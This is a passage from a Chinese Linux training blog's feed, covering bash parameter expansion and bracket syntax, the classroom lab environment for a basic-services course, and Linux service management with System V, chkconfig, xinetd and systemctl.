href="#3、四种模式匹配替换结构" class="headerlink" title="3、四种模式匹配替换结构"></a>3、四种模式匹配替换结构</h4><p>模式匹配记忆方法:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 是去掉左边(在键盘上<span class="comment">#在$之左边)</span></span></span><br><span class="line"><span class="meta">%</span><span class="bash"> 是去掉右边(在键盘上%在$之右边)</span></span><br><span class="line"><span class="meta">#</span><span class="bash">和%中的单一符号是最小匹配,两个相同符号是最大匹配。</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;var%pattern&#125;,<span class="variable">$&#123;var%%pattern&#125;</span>,<span class="variable">$&#123;var#pattern&#125;</span>,<span class="variable">$&#123;var##pattern&#125;</span></span></span><br></pre></td></tr></table></figure><h4 id="4、字符串提取和替换"><a href="#4、字符串提取和替换" class="headerlink" title="4、字符串提取和替换"></a>4、字符串提取和替换</h4><p>${var:num},${var:num1:num2},${var/pattern/pattern},${var//pattern/pattern}</p><ul><li>第一种模式:${var:num},这种模式时,shell在var中提取第num个字符到末尾的所有字符。若num为正数,从左边0处开始;若num为负数,从右边开始提取字串,但必须使用在冒号后面加空格或一个数字或整个num加上括号,如${var: -2}、${var:1-3}或${var:(-2)}。</li><li>第二种模式:${var:num1:num2},num1是位置,num2是长度。表示从$var字符串的第$num1个位置开始提取长度为$num2的子串。不能为负数。</li><li>第三种模式:${var/pattern/pattern}表示将var字符串的第一个匹配的pattern替换为另一个pattern。 。</li><li>第四种模式:${var//pattern/pattern}表示将var字符串中的所有能匹配的pattern替换为另一个pattern。</li></ul><h3 id="四、符号-后的括号"><a href="#四、符号-后的括号" class="headerlink" title="四、符号$后的括号"></a>四、符号$后的括号</h3><ul><li>(1) ${a} 变量a的值, 在不引起歧义的情况下可以省略大括号。</li><li>(2) $(cmd) 命令替换,和<code>cmd</code>效果相同,结果为shell命令cmd的输,过某些Shell版本不支持$()形式的命令替换, 如tcsh。</li><li>(3) $((expression)) 和<code>exprexpression</code>效果相同, 计算数学表达式exp的数值, 其中exp只要符合C语言的运算规则即可, 甚至三目运算符和逻辑表达式都可以计算。</li></ul><h3 id="五、使用多条命令执行"><a href="#五、使用多条命令执行" class="headerlink" title="五、使用多条命令执行"></a>五、使用多条命令执行</h3><ul><li>(1)单小括号,(cmd1;cmd2;cmd3) 新开一个子shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开,最后一个命令后可以没有分号。</li><li>(2)单大括号,{ cmd1;cmd2;cmd3;} 在当前shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开, 最后一个命令后必须有分号, 第一条命令和左括号之间必须用空格隔开。对{}和()而言, 括号中的重定向符只影响该条命令, 而括号外的重定向符影响到括号中的所有命令。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、小括号-圆括号&quot;&gt;&lt;a href=&quot;#一、小括号-圆括号&quot; class=&quot;headerlink&quot; title=&quot;一、小括号,圆括号()&quot;&gt;&lt;/a&gt;一、小括号,圆括号()&lt;/h3&gt;&lt;h4 id=&quot;1、单小括号&quot;&gt;&lt;a href=&quot;#1、单小括号&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="技术培训" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShell脚本教程" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/LinuxShell%E8%84%9A%E6%9C%AC%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="培训" scheme="http://www.toberoot.com/tags/%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShell脚本" scheme="http://www.toberoot.com/tags/LinuxShell%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>LINUX 基础服务课程环境使用说明</title>
    <link href="http://www.toberoot.com/2016/12/23/booboo_easy_service/00_linux_classroom_env/"/>
    <id>http://www.toberoot.com/2016/12/23/booboo_easy_service/00_linux_classroom_env/</id>
    <published>2016-12-22T21:06:27.000Z</published>
    <updated>2020-03-24T05:02:31.699Z</updated>
    
    <content type="html"><![CDATA[<p>UP100 课程基于RHEL6.5、RHEL7.0、ubuntu1604、WindowsXP和Windows2012R2系统</p><p>需要开启虚拟机可以直接双击图标，第一次启动时将从讲师机下载映像文件，可能会比较慢。</p><p>控制虚拟机可以使用kiosk用户，执行rht-vmctl命令，请自行查看命令使用。</p><h3 id="授课网络环境配置如下"><a href="#授课网络环境配置如下" class="headerlink" title="授课网络环境配置如下"></a>授课网络环境配置如下</h3><p><strong>f0~fN</strong>为教室物理机，其域名为<code>foundationN.ilt.example.com</code> ,可简写为<code>fN</code>。其IP为<code>172.25.N.250</code>，<code>f0</code>特殊为<code>172.25.254.250</code>。</p><p><code>classroom</code>虚拟机为所有物理机和虚拟机的默认网关，配置了多个网卡设置了所有<code>172.25.N.254</code>的地址，保证虚拟机、物理机和各个学生机之间的路由。配置了<code>DHCP</code>、<code>DNS</code>和<code>HTTP</code>服务，其域名为<code>classroom.example.com</code>可简写为<code>classroom</code>。</p><p>rhel6虚拟机均安装RHEL6.5系统，rhel7虚拟机均安装RHEL7.0系统，ubuntu1604虚拟机均安装Ubuntu1604系统，均安装图形化界面并配置runlevel 5启动，root密码为uplooking ，配置了基础的YUM源指向classroom， rhel6、rhel7、ubuntu1604、winxp和win2012r2虚拟机均配置了1块虚拟机网卡，eth0接入物理机br0网桥，动态获得ip地址:</p><table><thead><tr><th align="left">hostname</th><th align="left">ipaddr</th></tr></thead><tbody><tr><td align="left">rhel7</td><td align="left">172.25.N.10</td></tr><tr><td align="left">rhel6</td><td align="left">172.25.N.11</td></tr><tr><td align="left">winxp</td><td align="left">172.25.N.12</td></tr><tr><td align="left">ubuntu</td><td align="left">172.25.N.14</td></tr><tr><td align="left">win2012r2</td><td align="left">172.25.N.15</td></tr></tbody></table><p>rhel6、rhel7、ubuntu1604虚拟机均配置两块虚拟硬盘vda和vdb，以方便授课演示。除winxp和win2012r2之外其它虚拟机均配置2GB运行内存，winxp配置1GB运行内存，win2012r2配置4GB运行内存。</p><p>winxp虚拟机主机上安装了如下软件：</p><ul><li>Cisco Packet Tracer</li><li>Putty</li><li>Winscp</li><li>Xshell</li><li>Wireshark</li><li>Navicat for Mysql</li><li>Microsoft Visio 2010</li><li>7-zip</li></ul><p>已在classroom上完成DNS配置，正向和方向域名及邮件代理域名和虚拟机域名设置如下：</p><p>rhel7主机：172.25.N.10</p><ul><li>rhel7-fN.example.com</li><li>dN.example.com</li><li>imapN.example.com</li><li>smtpN.example.com (MX)</li></ul><p>rhel6主机： 172.25.N.11</p><ul><li>rhel6-fN.example.com</li><li>sN.example.com</li><li>wwwN.example.com</li><li>webapp-fN.example.com</li></ul><p>winxp主机： 172.25.N.12</p><ul><li>winxp-fN.example.com</li><li>install 主机：172.25.N.13</li><li>install-fN.example.com</li><li>ubuntu主机：172.25.N.14</li><li>ubuntu-fN.example.com</li></ul><p>win2012r2主机：172.25.N.15</p><ul><li>win2012r2-fN.example.com</li></ul><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>rhel6.5 SElinux有bug，光盘中默认没有selinux相关manpage，看manpage需要安装selinux-policy-doc包，但这个包需要从RHN下载。</p><h3 id="网络拓扑图"><a href="#网络拓扑图" class="headerlink" title="网络拓扑图"></a>网络拓扑图</h3><p><img src="pic/01-up100.png" alt="up100"></p><hr><h2 id="基础服务简介"><a href="#基础服务简介" class="headerlink" title="基础服务简介"></a>基础服务简介</h2><p>本章将讲解以下内容：</p><ul><li>RHEL6 中Linux系统服务的基础知识、System V与Xinetd的概念，以及通过 servcie 命令来启动某一服务，通过 chkconfig 命令来设置服务是否开机启动</li><li>RHEL7 中 已经替换掉 System V init，并正式采用全新的初始化进程 Systemd，以及通过systemctl 命令来启动某一服务和设置该服务是否开机启动</li></ul><blockquote><p>重点简介rhel6，rhel7只做命令的介绍，具体内容请参考《systemd说明》</p></blockquote><h3 id="系统服务的基本概念"><a href="#系统服务的基本概念" class="headerlink" title="系统服务的基本概念"></a>系统服务的基本概念</h3><p>服务，其实就是运行在操作系统后台的一个或者多个应用程序，为计算机系统或用户提供某项特定的服务。</p><p>在我们的windows操作系统中，其在后台也运行了许许多多的服务。例如我们装的杀毒软件，其在后台运行了许多我们看不见的服务程序，通过这些服务来为用户或者计算机系统来提高特定的功能。</p><p>服务通常是不中断运行的，随时准备接受请求，从而提供某项服务。例如我们日常使用的网页服务，其就是由一个运行在所访问网站的服务器上的httpd服务提供的服务，我们通过在浏览器输入需要访问网站的域名，服务器端的httpd服务就会随时的接收我们发送过来的请求，并响应回给我们的用户。</p><p>我们Linux系统绝大多数服务都是网络服务，例如邮件服务、FTP服务、httpd服务等等，网络服务可以使为其他用户、其他计算机提供特定的服务。</p><h3 id="services-和-daemons"><a href="#services-和-daemons" class="headerlink" title="services 和 daemons"></a>services 和 daemons</h3><table><thead><tr><th align="left">服务名</th><th align="left">守护进程名</th></tr></thead><tbody><tr><td align="left">rsyslog</td><td align="left">rsyslogd</td></tr><tr><td align="left">atd</td><td align="left">atd</td></tr><tr><td align="left">crond</td><td align="left">crond</td></tr></tbody></table><p><strong>服务的分类</strong> 服务名通常有两个，一个这个基于程序的服务名称，我们把它叫做service，比如说ftp服务，samba服务等等。<br>还有一个是基于进程的服务名称，我们通常把它叫做daemon，守护进程，也就是我们使用ps命令时候看到的名称，比如httpd，比如named之类的等等，一般服务的进程名都是程序名称后加上一个d，当然也有不少的特例。之后我们都会一一去说这些服务。</p><h3 id="基于-daemon-分类"><a href="#基于-daemon-分类" class="headerlink" title="基于 daemon 分类"></a>基于 daemon 分类</h3><p>那么根据daemon，也就是守护进程，我们可以把服务分成两类，一类是独立启动的服务，叫做stand alone daemon，我们之后学的服务基本上都是独立启动的服务。另外一种叫做super daemon。我们分开来来说一下这两种服务的特征。</p><ul><li>1&gt; stand alone daemon 独立启动服务</li><li>2&gt; super daemon 超级服务 xinted</li></ul><h4 id="System-V"><a href="#System-V" class="headerlink" title="System V"></a>System V</h4><p>总的来说，Linux系统通常作为服务器端的操作系统来用的，所以Linux系统提供了许许多的的服务，有些服务需要我们自己来进行配置，这些服务的目的就是为了给我们的计算机、用户提供某项特定的功能。那么对于各种不同的服务，Linux系统是怎么样来统一进行管理的呢？</p><p>在Linux操作系统中，Linux对于服务的管理体系是沿用了System V的服务管理体系，System V原来是早期AT&amp;T的一个操作系统。</p><p>对于Linux系统，System V提供了运行级别的概念，还记得之前一直提到过的Linux的启动运行级别吗？没错，System V一共提供了7种运行级别</p><p>0   关机</p><p>1   单用户模式</p><p>2   不带网络的多用户模式</p><p>3   带网络的多用户模式，纯文本界面</p><p>4   未使用</p><p>5   带网络的多用户模式，图形界面</p><p>6   重启</p><p>对于我们来说，通常使用的是级别3和级别5，每个级别下都有对应的启动、不启动的服务，比如单用户模式下，所有的服务都是不启动，这些都是通过System V这个服务管理体系来决定的</p><p>System V定义了init为系统启动的第一个进程，进程PID=1，这个进程的目的就是去查看 /etc/inittab 中的系统启动级别从而来启动对应的服务</p><p>对于不同的服务，因为其提供该服务的厂家不同，所以这些的服务的启动、关闭机制通常不同，在Linux系统中，为了方便的管理这些服务，每个服务的启动、结束、重启等操作都由一个System V脚本来进行控制，拥有固定的格式。</p><p>对于Linux系统上的服务，这些服务的System V脚本文件都是存放在 /etc/rc.d/init.d 这个目录下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# cd /etc/rc.d/init.d/</span><br><span class="line">[root@rhel6 ~]# ls</span><br><span class="line">abrt-ccpp         firstboot     messagebus      quota_nld    snmptrapd</span><br><span class="line">abrtd             functions     mysqld          rdisc        spice-vdagentd</span><br><span class="line">abrt-oops         haldaemon     netconsole      restorecond  sshd</span><br><span class="line">acpid             halt          netfs           rngd         sssd</span><br><span class="line">atd               htcacheclean  network         rpcbind      sysstat</span><br><span class="line">auditd            httpd         NetworkManager  rpcgssd      udev-post</span><br><span class="line">autofs            ip6tables     nfs             rpcidmapd    vboxadd</span><br><span class="line">blk-availability  iptables      nfslock         rpcsvcgssd   vboxadd-service</span><br><span class="line">bluetooth         irqbalance    ntpd            rsyslog      vboxadd-x11</span><br><span class="line">certmonger        kdump         ntpdate         sandbox      vncserver</span><br><span class="line">cpuspeed          killall       oddjobd         saslauthd    wdaemon</span><br><span class="line">crond             lvm2-lvmetad  portreserve     single       winbind</span><br><span class="line">cups              lvm2-monitor  postfix         smartd       wpa_supplicant</span><br><span class="line">dnsmasq           mdmonitor     psacct          snmpd        ypbind</span><br></pre></td></tr></table></figure><p>我们看到在这个目录下，存在了许多纯文本文件，这些文件都是系统每一个服务的System V的脚本文件，对于该脚本文件，我们要启动什么服务，都是通过这些脚本文件来启动的，我们也可以通过编写System V脚本文件来手工创建一个我们自己的由System V来控制的服务。</p><p>对于Linux的所有的这些服务，我们通过 service 这个命令来进行统一的管理</p><p>命令 service 可以调用指定服务的System V脚本，并执行指定的动作</p><p><code>service 服务名 [start | stop | restart | status]</code></p><p>对于Linux系统的这些服务，我们都是通过 service 这个命令去调用该服务对应的System V脚本，并执行其指定的动作</p><p>刚才我们也说到了，System V定义了运行级别的概念，每个运行级别对应有启动、不启动的服务，在 <code>/etc/rc.d</code> 这个目录下，除了我们刚才的 init.d 这个目录，我们还发现还有其它的一些目录，诸如 rc0.d、rc1.d等这些目录就分别对应了系统的7中启动级别，每个目录里面都存放了许多的<br>文件，每个文件对应着一个特定的服务，并标志有是否开机启动以及启动顺序。</p><p>我们发现，在这些目录里面，存放的都是链接文件，不过这每一个链接文件的名字都有着严格的规定。每一个链接文件都由3部分组成</p><p><code>K15httpd -&gt; ../init.d/httpd　　　　S55sshd -&gt; ../init.d/sshd</code></p><ul><li>①第一个部分是第一个字母K或者S，表示该服务是不是是不是开机自动启动，K表示开机不启动，S表示开机就启动</li><li>②第二个部分是一个数字，这个数字代表的是该服务的启动顺序，服务启动的顺序非常的重要，例如我们的网络服务需要在邮件服务之前启动</li><li>③第三个部分就是对应服务的名字，该链接文件其实都是指向的是 init.d 这个目录下的System V脚本文件</li></ul><p>我们如果希望某服务开机就启动，可以通过修改 rc5.d 目录下的链接文件，不过这样做很麻烦，Linux系统提供了一个 <code>chkconfig</code> 命令可以来设置服务是否开机启动</p><p>我们通过 <code>chkconfig --list</code> 命令来查看所有服务的开机启动情况</p><p>比如我们需要设置 network 服务开启自动启动，可以使用 <code>chkconfig httpd on</code> 命令即可</p><p>比如我们需要设置 network 服务开启不启动，可以使用 <code>chkconfig httpd off</code> 命令即可</p><h4 id="xinetd"><a href="#xinetd" class="headerlink" title="xinetd"></a>xinetd</h4><p>其实对于上面通过 System V来管理的一些服务都属于Linux系统的常驻运行的服务，其实在Linux系统中还有许多不常驻的一些服务，例如 telnet、rsync服务，这些服务则是通过 xinetd 这个服务来进行管理的。</p><p>xinetd 控制的就是那些不常驻的服务，功能较为简单的服务</p><p>xinetd其实自己本身就是作为一个系统的常驻的服务运行在后台，而xinetd所控制的服务在没有连接请求的时候是不运行的，所有xinetd控制的服务的连接请求都会提交给xinetd来进行代理</p><p>xinetd在收到一个请求后，会根据请求的协议及服务启动相应的服务进程，进程处理完后请求就会结束</p><p>xinetd本身就是一个系统服务，通过 System V来对其进行管理，在CentOS6/RHEL6中，xinetd服务默认是没有安装的，我们若要使用该服务，首先需要安装它<code>yum install xinetd</code></p><p>在我们安装好我们的<code>xinetd</code>服务以后，我们这时再通过 <code>chkconfig --list</code> 命令来查看所有的服务启动设置</p><p>我们看到，在安装了xinetd服务以后，其下面出现了一些其他的服务选项，例如<code>rsync</code>，<code>chargen-dgram</code>等这些服务，这些服务都是系统的一些不常驻服务，都是通过xinetd这个服务来对其进行管理的</p><p><code>xinetd</code>服务的配置文件是 <code>/etc/xinetd.conf</code></p><h3 id="端口号"><a href="#端口号" class="headerlink" title="端口号"></a>端口号</h3><ul><li>查看 <code>netstat -luntp</code></li><li>软件名    <code>net-tools</code></li></ul><h3 id="基础服务总结"><a href="#基础服务总结" class="headerlink" title="基础服务总结"></a>基础服务总结</h3><p><strong>RHEL 6</strong></p><p>服务的启动 停止 重启 状态    <code>service 服务名 [start | stop | restart | status]</code></p><p>服务开机启动状态        <code>chkconfig --list</code></p><p>设置服务开机启动        <code>chkconfig 服务名 on</code></p><p>设置服务开机不启动        <code>chkconfig 服务名 off</code></p><p><strong>RHEL 7</strong></p><p>服务的启动 停止 重启 状态    <code>systemctl [start | stop | restart | status] 服务名</code></p><p>设置服务开机启动        <code>systemctl enable 服务名</code></p><p>设置服务开机不启动        <code>systemctl disable 服务名</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;UP100 课程基于RHEL6.5、RHEL7.0、ubuntu1604、WindowsXP和Windows2012R2系统&lt;/p&gt;
&lt;p&gt;需要开启虚拟机可以直接双击图标，第一次启动时将从讲师机下载映像文件，可能会比较慢。&lt;/p&gt;
&lt;p&gt;控制虚拟机可以使用kiosk用户，执
      
    
    </summary>
    
    
      <category term="技术培训" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="Linux简易服务教程" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/Linux%E7%AE%80%E6%98%93%E6%9C%8D%E5%8A%A1%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="培训" scheme="http://www.toberoot.com/tags/%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="Linux基础服务" scheme="http://www.toberoot.com/tags/Linux%E5%9F%BA%E7%A1%80%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
</feed>
